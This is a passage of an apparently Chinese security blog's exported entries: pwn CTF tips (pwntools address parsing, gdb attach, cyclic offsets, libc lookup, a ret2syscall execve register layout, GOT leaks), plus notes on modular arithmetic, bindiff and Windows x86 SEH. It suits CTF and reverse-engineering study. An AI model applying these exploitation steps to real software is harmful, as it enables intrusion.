class="comment">####这里里面填入的字符为0x前面的字符</span></span><br><span class="line">imp_addr=<span class="built_in">eval</span>(p.recv(<span class="number">10</span>))</span><br></pre></td></tr></table></figure><p>也可以这样</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">imp_addr=<span class="built_in">eval</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">11</span>:-<span class="number">1</span>])<span class="comment">###recvuntil里面填入的字符是想要字符的后面的个字符</span></span><br></pre></td></tr></table></figure><p>程序为多行输出的时候，也可以这样</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;gift!\n&#x27;</span>)</span><br><span class="line">addr=<span class="built_in">eval</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">11</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="comment">###程序输出是这样的：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">OHHH!,give you a gift!</span></span><br><span class="line"><span class="string">0x565af770</span></span><br><span class="line"><span class="string">Input:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>其中第-1个字符是’\n’，由于python左闭右开的特点，最后写-1刚好能滤掉\n</p><p>eval函数可以参考一下python基础语法</p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>发送完payload之后想用gdb调试一下，</p><p>可以在这样</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">······</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x080485E5&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br></pre></td></tr></table></figure><p>在发送payload前使用gdb.attach语句</p><p>第二个参数相当于在gdb里面下断点，一般是输入函数的下一个地址</p><p>进入gdb调试后，先按一下c，然后就发现断在了之前写的那个地址</p><p>这时候可以用stack 50指令查看一下当前程序里栈的情况</p><p>有时上述情况会失败，这里介绍另一种调试方法</p><p>在py文件的输入前使用pause函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pause()</span><br></pre></td></tr></table></figure><p>等程序运行到pause后重新开一个终端输入 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb attach 4575(pid)</span><br></pre></td></tr></table></figure><p>进入gdb 后在输入后下断点，之后按下c，让程序继续执行</p><p>之后转到之前的终端，回车使得脚本继续运行，此时即可以实现调试功能</p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>使用cyclic计算偏移量</p><p>步骤：</p><p>1.首先在终端用cyclic 200指令生成一个序列，这个序列是cyclic特定的序列</p><p>然后复制这个序列</p><p>2.用gdb pwn指令调试本地程序，一直运行到输入阶段，将刚刚生成的序列复制输入进去，然后回车</p><p>3.继续c运行程序，最后程序肯定会断在一个地方，ret 某个错误地址，记住这个地址的低4个字节</p><p>4.然后重新开一个终端，输入指令cyclic -l 0xxxxxxxxx  （这个就写刚刚的低四个字节）,cyclic会返回一个数，这个数就是偏移量，从输入的地址一直到ret的地址</p><p><img src="/../imgs/202307112251057.png" alt="image-20230711225109422"></p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>在线查找libc库</p><blockquote><p><a href="https://libc.rip/">https://libc.rip/</a></p></blockquote><p>注意地址写后三位</p><p>LibcSeacher联机查找，不需要下辣么多版本的库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 install LibcSearcher</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/MDong1344/article/details/120277351">https://blog.csdn.net/MDong1344/article/details/120277351</a></p></blockquote><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">*<span class="comment"># 给定字节串表示的地址* </span></span><br><span class="line">address_bytes =<span class="string">b&#x27;P\x0e\xc8\x9d\x12\x7f\n&#x27;</span> </span><br><span class="line"><span class="comment"># 将字节串转换为整数（假设是小端序）* </span></span><br><span class="line">address_int = <span class="built_in">int</span>.from_bytes(address_bytes, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>64位ret2syscall</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rax=<span class="number">0x3b</span></span><br><span class="line">rdi=bin_sh_addr</span><br><span class="line">rdx=<span class="number">0</span></span><br><span class="line">rsi=<span class="number">0</span></span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h1 id="4-11更新"><a href="#4-11更新" class="headerlink" title="4.11更新"></a>4.11更新</h1><h2 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context(log.level=<span class="string">&#x27;debug&#x27;</span>)</span><br></pre></td></tr></table></figure><p>别说了，问就是真神</p><h2 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_plt=elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got=elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学数论基础-自己的思考</title>
      <link href="/2023/04/23/2023-04-23-%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9A%84%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80-%E4%B8%80%E7%82%B9%E8%87%AA%E5%B7%B1%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2023/04/23/2023-04-23-%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9A%84%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80-%E4%B8%80%E7%82%B9%E8%87%AA%E5%B7%B1%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="前前言"><a href="#前前言" class="headerlink" title="前前言"></a>前前言</h1><p>下面是记录的一些可能会用到的markdown数学公式语法，读者完全可以忽略掉这部分内容<br>$$<br>\epsilon  \frac {1}{2}  \equiv \mod{a}  \pm  \sum \prod \pmod{a}<br>\bull  \Leftarrow  \Leftrightarrow \Rightarrow \ne<br>$$</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学密码学的数论知识，有些问题的证明在课程中没有讲到，在此我进行了自己的思考，并对某些问题给出证明过程，但是由于这些仅仅是本人独自思考的产物，因此可能显得非常随意，读者不要太过在意。</p><h1 id="第一个问题：模运算下的除法化简（不是乘法逆元）"><a href="#第一个问题：模运算下的除法化简（不是乘法逆元）" class="headerlink" title="第一个问题：模运算下的除法化简（不是乘法逆元）"></a>第一个问题：模运算下的除法化简（不是乘法逆元）</h1><p>模运算中有以下结论：</p><p>现在有一个同余式：<br>$$<br>a\equiv b \pmod{n}<br>$$<br>假设a和b有公约数t,那么上面这个式子就可以进行化简</p><p>接下来分为两种情况：<br>$$<br>第一种情况：gcd(t,n)&#x3D;1,也就是t和n互为素数时，有\<br>a&#x2F;&#x2F;t \equiv b&#x2F;&#x2F;t \pmod{n}\<br>第二种情况，gcd(t,n) \ne 1,也就是t和n不互为素数时，一定有\<br>a&#x2F;&#x2F;t\equiv b&#x2F;&#x2F;t \pmod{n&#x2F;&#x2F;t}\<br>不一定有\<br>a&#x2F;&#x2F;t \equiv b&#x2F;&#x2F;t \pmod{n}\<br>$$<br>在这里给出笔者的证明过程</p><h2 id="证明（以笔者的思考过程为线索）"><a href="#证明（以笔者的思考过程为线索）" class="headerlink" title="证明（以笔者的思考过程为线索）"></a>证明（以笔者的思考过程为线索）</h2><p>首先讨论一下第二种情况下的必然情况，即<br>$$<br>a&#x2F;&#x2F;t\equiv b&#x2F;&#x2F;t \pmod{n&#x2F;&#x2F;t}\<br>$$<br>我们可以将原来的式子展开<br>$$<br>a&#x3D;kn+b<br>$$<br>其中t为a,b,n公共的因子，那么显然,两遍同时除以t，有<br>$$<br>a&#x2F;&#x2F;t&#x3D;k(n&#x2F;&#x2F;t)+b&#x2F;&#x2F;t<br>$$<br>那么第二种情况下的必然情况就可以证明了</p><p>于是现在就有问题，为什么第一种情况可以呢？如果我们将原来的式子展开<br>$$<br>a&#x3D;kn+b<br>$$<br>此时t不是n的因子，如果要将两边同时除以t，那么只有可能是k被t除掉了，但是t|k这种情况不一定啊，直接在两边同时除以t怎么就可以了？？？</p><p>于是，我们接下来就应该要证明在t和n互为素数的情况下t一定整除k</p><p>emmmm</p><p>我们不妨从除法的逆运算——乘法开始探索一下？</p><p>我们知道模运算下乘法是显然成立的，即</p><p>我们假设有一个新的同余式<br>$$<br>a \equiv b \pmod{n}<br>$$<br>现在我们让等式两边同乘以m<br>$$<br>ma \equiv mb   \pmod{n}<br>$$<br>我们把它展开看看<br>$$<br>ma  &#x3D; mkn+mb<br>$$<br>其中k是在原来的同余式展开的情况下n的系数</p><p>诶，如果把这里的ma ， mk  ，mb都看做是a,k,b，那么不就是我们的第一种情况吗！</p><p>这里的m就看做我们最开始的那个t，那么第一种情况能够成立就非常显然了！</p><p>emmmm 但是当第一种情况的结论套在第二种情况下怎么就不一定了呢？</p><p>我们考虑，第一种情况下 的<br>$$<br>a \equiv b \pmod{n}<br>$$<br>其实可以看做是通过我们刚刚乘以m这个方式构造出来的，那么再除回去也很正常了，也就是说当t和n互为素数的情况下,n前面的系数k一定可以被t整除，如果k不能被t整除的话，那么就不可能出来这个同余式子，因为展开后等式两边没有共同的因子t，因此这个同余式就不可能被构造出来。</p><p>但是如果n和t是互为素数的情况下,这种情况就不一定了，等式两边的公共因子t可以被n提供，这样k就不必被t整除了，这也就是第一种情况的结论套用在第二种情况下不一定成立的原因了。</p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>这里的证明过程显然复杂了，但这是我自己的思考历程，其中在第一种情况下t|k这个条件完全可以直接的出来，但是我显然没有这种经验积累或者说是观察力，只能通过逆向分析才能得到。</p><p>这里就积累一个显然的结论：<br>$$<br>等式如果成立，且等式一边可以被某一个数整除，则等式另一边也必然可以被这个数整除，否则等式不成立。<br>$$</p><h1 id="第二个问题"><a href="#第二个问题" class="headerlink" title="第二个问题"></a>第二个问题</h1><p>欧拉定理的证明中有这样一句话：<br>$$<br>Z_n ^* 中各个整数不同，乘以a并对n取模后仍然不同,其中gcd(a,n)&#x3D;1<br>$$<br>这句话并不是很显然，但是课程中并没有进行证明，因此在此，我对这个问题进行一下证明</p><h2 id="一些知识"><a href="#一些知识" class="headerlink" title="一些知识"></a>一些知识</h2><ol><li>$$<br>Z_n ^* 是什么？\<br>Z_n ^*是在1到n之间与n互为素数的数的集合<br>$$<br>显然，在这个集合中各个元素互不相同，这些元素乘以与n互为素数的a后的值仍然互不相同，也就是说，这形成了一个双射。</li></ol><h2 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h2><p>这里要用到我们之前积累的结论了：</p><p>*** 等式如果成立，且等式一边可以被某一个数整除，则等式另一边也必然可以被这个数整除，否则等式不成立。***</p><p>这个问题等价于下面这个问题<br>$$<br>a,b \epsilon Z_n^* ,当gcd(t,n)&#x3D;1时，\<br>at\equiv bt \pmod{n}不成立<br>$$<br>将这个同余式展开得到<br>$$<br>at&#x3D;bt+kn<br>$$<br>其中gcd(a,n)&#x3D;1,gcd(b,n)&#x3D;1</p><p>显然等式左边可以被t或者t的因子整除，那么等式右边也应该能被t或者t的因子整除，但是我们知道gcd(t,n)&#x3D;1，也就是说kn这一项无论如何也不能被t或者t的因子整除，那么这个式子就不成立，也就是说原结论必然成立。</p><h2 id="反思-1"><a href="#反思-1" class="headerlink" title="反思"></a>反思</h2><p>在这里进行思考的时候，我已经对上面那个问题进行了分析，但是没有总结出显而易见的结论，从而导致在这个题的时候我其实是又进行了一遍分析，最后在写博客的时候才发现原来用上第一个问题得出的结论就能够出来答案。</p><p>也就是说，其实这个结论还挺显然的……</p>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bindiff</title>
      <link href="/2023/04/19/2023-04-19-bindiff%EF%BC%88%E4%B8%80%E4%B8%AA%E7%94%A8%E4%BA%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E7%9A%84%E5%AF%B9%E6%AF%94%E5%B7%A5%E5%85%B7%EF%BC%89/"/>
      <url>/2023/04/19/2023-04-19-bindiff%EF%BC%88%E4%B8%80%E4%B8%AA%E7%94%A8%E4%BA%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E7%9A%84%E5%AF%B9%E6%AF%94%E5%B7%A5%E5%85%B7%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在4.16进行的广东海洋大学校赛中获得的新知识。</p><p>一个用于二进制文件对比的工具，比如现在有两个文件，他们大部分是相似的，只有少许不同，我们需要找不同的时候，就可以用到这个工具了。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>前提：java环境、有IDA</p><p>我的IDA版本是v7.0</p><p>前往官网下载（挂代理）：<a href="https://www.zynamics.com/software.html">https://www.zynamics.com/software.html</a></p><p>点击msi字样的文件进行下载，我下载时最新版本是bindiff7</p><p>下载完成后进行安装，这里我安装在了D盘</p><p>我这个版本的bindiff安装程序中没有提示IDA的目录，因此我这里以我的版本进行讲解</p><p>然后将 Plugins\IDA Pro目录下的四个dll文件复制到IDA中的\plugins路径下</p><p>然后安装就成功了</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>打开IDA，在IDA菜单页面中查看plugins中是否有bindiff</p><p>如果有的话就说明安装成功了，如果没有，很有可能是IDA版本不合适</p><p>现在我们有两个想要比较的二进制文件，首先使用IDA打开其中一个，然后关闭，目的是获得.i64文件。然后再用IDA打开另一个文件，点击插件中的bindiff，然后选择上面的蓝色选项，之后再在目录中找到刚刚的.i64文件并确定。OK，现在已经可以看到，在函数栏中，大部分函数已经变成了绿色，其中有和大多数的函数颜色不同的函数，那这个函数就是我们要找的那个有差异的函数了。</p><p>参考：<a href="https://www.cnblogs.com/lsdb/p/10543411.html">https://www.cnblogs.com/lsdb/p/10543411.html</a></p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bindiff </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows x86 SEH学习</title>
      <link href="/2023/04/08/2023-04-08-windows%20x86%20SEH%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/04/08/2023-04-08-windows%20x86%20SEH%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考师傅博客：</p><blockquote><p><a href="https://www.yunzh1jun.com/2022/05/27/WindowsSEH/">https://www.yunzh1jun.com/2022/05/27/WindowsSEH/</a></p><p><a href="http://s0rry.cn/archives/yi-chang-chu-li-yuan-li-ji-zhan-zhan-kai-xiang-guan-cao-zuo">http://s0rry.cn/archives/yi-chang-chu-li-yuan-li-ji-zhan-zhan-kai-xiang-guan-cao-zuo</a></p></blockquote><p>参考其他文章：</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/573449712">https://zhuanlan.zhihu.com/p/573449712</a></p></blockquote><p>参考视频链接：</p><blockquote><p><a href="https://youtu.be/COEv2kq_Ht8">https://youtu.be/COEv2kq_Ht8</a></p></blockquote><p>这是youtube上的，b站有人搬运了</p><blockquote><p><a href="https://www.bilibili.com/video/BV1UU4y1K7et?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1UU4y1K7et?spm_id_from=333.337.search-card.all.click</a></p></blockquote><p>这两个视频是一样的，但是如果有条件最好还是看youtube上的，也有中文翻译。</p><p>这个视频非常推荐，建议仔细观看！</p><h1 id="一些需要扫盲的知识"><a href="#一些需要扫盲的知识" class="headerlink" title="一些需要扫盲的知识"></a>一些需要扫盲的知识</h1><p>读者们可能在系统学习SEH之前了解过相关名词，什么异常处理，什么SEH链之类的，这里讲一下我在学习过程中感到疑惑的知识。</p><ol><li><p>SEH是<em><strong>Windows操作系统</strong></em>提供的一种异常处理方式，也就是说，<em><strong>它跟语言的选择没有关系</strong></em>，你当然可以使用C语言，也可以使用其他语言，甚至还可以使用汇编语言！ 但是，要使用SEH必要的条件是你要在Windows操作系统上使用！这意味着你不能在linux下使用。</p></li><li><p>我们这里讲解的是windows x86平台级别的SEH异常处理，关键词是<code>__try / __except</code> ，要注意与try&#x2F;catch的区别。</p></li></ol><p>下面是二者的区别（来自chatgpt)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">try/catch是C++和Java等语言中的异常处理机制，用于捕获和处理程序中的异常。try块中放置可能会抛出异常的代码，catch块中放置对异常的处理代码。当try块中的代码抛出异常时，程序会跳转到最近的匹配异常类型的catch块中进行处理。</span><br><span class="line"></span><br><span class="line">__try/__except是Windows平台下的异常处理机制，用于处理系统级别的异常，比如访问非法内存、除零等。__try块中放置可能会抛出异常的代码，__except块中放置对异常的处理代码。当__try块中的代码抛出异常时，程序会跳转到__except块中进行处理。</span><br><span class="line"></span><br><span class="line">因此，try/catch适用于C++和Java等语言中的程序级别异常处理，而__try/__except适用于Windows平台下的系统级别异常处理。</span><br><span class="line"></span><br><span class="line">3.  即使是SEH,在x86和x64平台上也有很大区别！微软在设计x64的时候考虑到了x86平台中SEH的缺陷，于是在x64平台内就将SEH重新进行了设计。本章主要以x86平台的SEH为主，也会讲解x64平台的机制。如果读者在自己编写测试程序时与学到的内容不同，不妨看一下是不是平台不同导致的原因。</span><br><span class="line">3.  except handler3和except handler4都是编译器级别提供的异常处理函数，这两个版本的异常处理函数是由于编译器不同而导致的。目前最新版本的visual studio 提供的是except handler4</span><br><span class="line"></span><br><span class="line"># 0x01:底层系统的相关知识</span><br><span class="line"></span><br><span class="line">大家在学习反调试的时候可能会接触一个叫做线程环境块（TEB)的内容，本文将从TEB开始阐述。</span><br><span class="line"></span><br><span class="line">TEB部分定义：</span><br><span class="line"></span><br><span class="line">```C++</span><br><span class="line">typedef struct _TEB&#123;</span><br><span class="line">NT_TIB Tib;</span><br><span class="line">PVOID EnvironmentPointer;</span><br><span class="line">    //····</span><br><span class="line">&#125;TEB,*PTEB;</span><br></pre></td></tr></table></figure><p>在这里我们主要关注TIB的部分。</p><p>TIB（线程信息块）的部分定义：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_NT_TIB</span>&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> *ExceptionList;</span><br><span class="line">    <span class="comment">//···</span></span><br><span class="line">&#125;NT_TIB;</span><br></pre></td></tr></table></figure><p>上面的部分是每个程序都有的，具体情况在这里不多作阐释，只解释和本文相关的知识。</p><p>其中我们要注意TIB中的第一个成员，这个成员是一个链表结构，这就是我们所说的SEH链了。</p><p>当程序发生异常时，会通过一定的方法在这个SEH链中寻找异常的解决办法，并沿着这个链一直找，没错，SEH链中存储着异常的解决办法。</p><p>接下来，我们就讲一下这个结构体的相关知识：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> *Next; <span class="comment">//ext成员指向下一个_EXCEPTION_REGISTRATION_RECORD结构体指针</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;  <span class="comment">//handler成员是异常处理函数</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br><span class="line"><span class="comment">//若Next成员的值为FFFFFFFF，则表示它是链表最后一个结点</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个结构体就是一个简单的链表，Handler成员就是具体的异常处理函数，Next成员指向下一个<code>_EXCEPTION_REGISTRATION_RECORD</code>.</p><p>然而这个版本的SEH链太简单了，这么简单肯定不符合我们的认知。（太简单的版本肯定就不安全）</p><p>于是编译器就提供了更复杂的版本，当然，在系统级别还是上面这个简单的版本，编译器提供的只是在这个简单版本的扩充。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">C_EXCEPTION_REGISTARATION_RECORD</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span>* StackPointer;<span class="comment">// 记录栈帧，便于在发生异常时定位栈位置</span></span><br><span class="line">EXCEPTION_POINTERS* Exception;<span class="comment">//  包含线程上下文以及操作系统记录异常信息的结构体</span></span><br><span class="line">EXCEPTION_REGISTRATION_RECORD HandlerRegistration;<span class="comment">//异常处理结构体SHE链上的那个</span></span><br><span class="line">SCOPETABLE_ENTRY* ScopeTable;</span><br><span class="line"><span class="type">int</span> TryLevel;<span class="comment">// 当前状态等级</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到第三个成员就是原先的版本。</p><p>这里千万要注意，这个复杂版本的结构体是<em><strong>编译器</strong></em>级别的！</p><p>可以理解为，编译器作为一个程序员，它自己定义了一个结构体，操作系统是不会知道这个结构体的存在的！它只认得它原来的简单链表！</p><h1 id="0x02-异常处理函数注册"><a href="#0x02-异常处理函数注册" class="headerlink" title="0x02: 异常处理函数注册"></a>0x02: 异常处理函数注册</h1><p>OK，现在我们已经知道，操作系统提供了一个简单链表，我们可以通过在这个简单链表上添加自己的异常处理函数，从而实现我们想要的异常处理。</p><p>这里以汇编语言来解释如何注册异常处理函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH @MyHandler; 要添加的异常处理器</span><br><span class="line">PUSH DWORD PTR FS:[0] ; 原先的异常列表</span><br><span class="line">MOV DWORD PTR FS:[0], ESP ; 将添加后的链表设置到链表</span><br></pre></td></tr></table></figure><p>其中FS[0]就是SEH链的头节点。</p><p>从这里也可以看到，x86平台上是以栈来存储这个链表的，注册异常处理函数的时候，只需要压入我们异常处理函数，再压入原先的SEH头结点，再把当前的节点设置为新的头结点。</p><p>很好，这很符合我们对链表的认知。</p><p>当然，在高级语言中也可以使用这样的注册方法。</p><p>但是，在VS的C语言中，我们还可以使用另一种更方便的方法来进行异常处理函数的注册。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__try &#123;</span><br><span class="line">        <span class="comment">// 受保护的代码</span></span><br><span class="line">&#125;</span><br><span class="line">__except ( <span class="comment">/*异常过滤器exception filter*/</span> ) &#123;</span><br><span class="line">        <span class="comment">// 异常处理程序exception handler</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，要注意，我们要更换我们的思维了，现在我们不必使用原先的简陋的SEH链表，我们可以使用编译器提供的更高级的链表。</p><p>这里再提一嘴 <em><strong>这里是编译器级别的！</strong></em>，但是底层系统级别的仍然是简陋的SEH链表。</p><p>以下内容引用自<em><strong>云之君</strong></em>师傅的博客。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__try</span><br><span class="line">__try块中包含可能触发异常的代码。如果代码抛出异常，则交由__except块处理。</span><br><span class="line"></span><br><span class="line">__except</span><br><span class="line">__except块中是用户定义的处理异常的代码。</span><br><span class="line"></span><br><span class="line">exception filter</span><br><span class="line">exception filter称为异常过滤器。顾名思义，它的作用是对异常进行过滤。</span><br><span class="line"></span><br><span class="line">异常过滤器只有三个值（定义在Windows的Excpt.h中）：</span><br><span class="line"></span><br><span class="line">EXCEPTION_CONTINUE_EXECUTION（<span class="number">-1</span>）</span><br><span class="line">在发生异常的地方继续执行。</span><br><span class="line">EXCEPTION_CONTINUE_SEARCH （<span class="number">0</span>）</span><br><span class="line">异常无法识别。继续搜索下一个处理程序。</span><br><span class="line">EXCEPTION_EXECUTE_HANDLER （<span class="number">1</span>）</span><br><span class="line">异常被识别。通过执行控制转移到异常处理程序__except复合语句，然后继续执行__except块。</span><br><span class="line">异常过滤器决定了是否处理当前异常，即是否执行__except块中的代码（异常处理程序exception handler）。</span><br><span class="line"></span><br><span class="line">异常过滤器的使用：</span><br><span class="line"></span><br><span class="line">__try &#123;</span><br><span class="line">   ……</span><br><span class="line">&#125;</span><br><span class="line">__except ( <span class="built_in">MyFilter</span>( <span class="built_in">GetExceptionCode</span>() ) )</span><br><span class="line">&#123;</span><br><span class="line">   ……</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LONG <span class="title">MyFilter</span><span class="params">(DWORD dwExceptionCode )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( dwExceptionCode == EXCEPTION_ACCESS_VIOLATION )</span><br><span class="line">                <span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER ;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH ;</span><br><span class="line">&#125;</span><br><span class="line">对于这段代码而言，在异常过滤器中自定义了一个函数MyFilter，以<span class="built_in">GetExceptionCode</span>()的返回值作为参数，返回值是一个异常过滤器的值，所以也可以直接在__except块的参数中写入异常过滤器的值，如__except (EXCEPTION_EXECUTE_HANDLER) 。</span><br><span class="line">具体而言，<span class="built_in">GetExceptionCode</span>()函数返回__try块中产生的异常值（也就是产生异常的原因），据此我们可以实现对异常的过滤。</span><br></pre></td></tr></table></figure><p>OK ,现在我们也已经简单了解了这几个关键词的使用。</p><p>接下来又是一个非常关键的内容：</p><p><em><strong>不要认为__try&#x2F;__except关键词使用的异常处理机制与我们之前讲的SEH机制不同！，在编译器层次中，会将关键词中的异常处理转化成SEH节点并插入SEH链表！</strong></em></p><p>这里就要涉及到新的结构体：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">C_EXCEPTION_REGISTARATION_RECORD</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span>* StackPointer;<span class="comment">// 记录栈帧，便于在发生异常时定位栈位置</span></span><br><span class="line">EXCEPTION_POINTERS* Exception;<span class="comment">//  包含线程上下文以及操作系统记录异常信息的结构体</span></span><br><span class="line">EXCEPTION_REGISTRATION_RECORD HandlerRegistration;<span class="comment">//异常处理结构体SHE链上的那个</span></span><br><span class="line">SCOPETABLE_ENTRY* ScopeTable;</span><br><span class="line"><span class="type">int</span> TryLevel;<span class="comment">// 当前状态等级</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中每个成员都很重要。</p><p>其中ScopeTable也是个结构体，这个结构体中包含了我们之前讲解关键词中给出的过滤器函数和异常处理函数。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">SCOPETABLE_ENTRY</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int32_t</span> EnclosingLevel; <span class="comment">// 状态等级</span></span><br><span class="line">FILTER_CALLBACK* Filter; <span class="comment">// 指向异常过滤器的地址，如果是finally没有位nullptr</span></span><br><span class="line">HANDLER_CALLBACK* Handler; <span class="comment">// 指向except/finally的块地址 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>OK,这里可能有的同学就会有问题了，既然在scopetable中有了异常处理函数，那么原来的EXCEPTION_REGISTRATION_RECORD中的异常处理函数是干嘛的？</strong></p><p>这个问题非常好，因为这也正是我学习的过程中产生疑问的地方。</p><p>具体来说，EXCEPTION_REGISTRATION_RECORD中的异常处理函数会调用scopetable中的异常处理函数。</p><h1 id="0x03-异常处理机制的实现过程"><a href="#0x03-异常处理机制的实现过程" class="headerlink" title="#0x03:异常处理机制的实现过程"></a>#0x03:异常处理机制的实现过程</h1><p>发生异常时，我们的异常处理机制是如何工作的？</p><p>这里涉及到栈展开等一系列用文字很难表达清楚的事情。</p><p>即使看了这么多大佬的博客，我也没有看到一篇能更通俗易懂的讲解这个过程的文章。</p><p>所以，我也没有自信能够在很短的文字内就可以将这个过程讲解给你。</p><p>因此，这里我推荐观看视频讲解：</p><blockquote><p><a href="https://youtu.be/COEv2kq_Ht8">https://youtu.be/COEv2kq_Ht8</a></p></blockquote><p>简单来说，我们的异常处理函数是在函数头的位置注册的，当发生异常时，EXCEPTION_REGISTRATION_RECORD中的异常处理函数会一层一层调用scopetable中的函数，直到找到一个能处理这个异常的函数。找到这个能够处理这个异常的异常处理函数肯定需要一个标志，标志是什么呢？</p><p>在于Handler的返回值。</p><p>Handler的返回值是一个枚举类型_EXCEPTION_DISPOSITION。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_EXCEPTION_DISPOSITION</span></span><br><span class="line">&#123;</span><br><span class="line">    ExceptionContinueExecution = <span class="number">0</span>, <span class="comment">//已经处理了异常，回到异常触发点继续执行</span></span><br><span class="line">    ExceptionContinueSearch = <span class="number">1</span>,    <span class="comment">//没有处理异常，继续遍历异常链表</span></span><br><span class="line">    ExceptionNestedException = <span class="number">2</span>,   <span 